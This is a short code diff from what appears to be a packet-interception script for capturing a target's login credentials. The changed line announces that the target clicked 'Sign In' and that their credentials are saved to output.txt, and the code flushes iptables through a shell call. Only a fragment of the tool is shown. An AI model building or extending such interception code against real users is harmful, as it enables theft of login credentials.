@@ -72,7 +72,7 @@ def process_packet(packet):
                 if "redirect" in qname:
                     packet.accept()
 #                    time.sleep(1)
-                    print("We're on the right track")
+                    print("Target clicked 'Sign In'. Check output.txt for the credentials they used.")
                     subprocess.call(["iptables -F"], shell=True)
     
     # k, it won't forward bcak to target without this .accept()
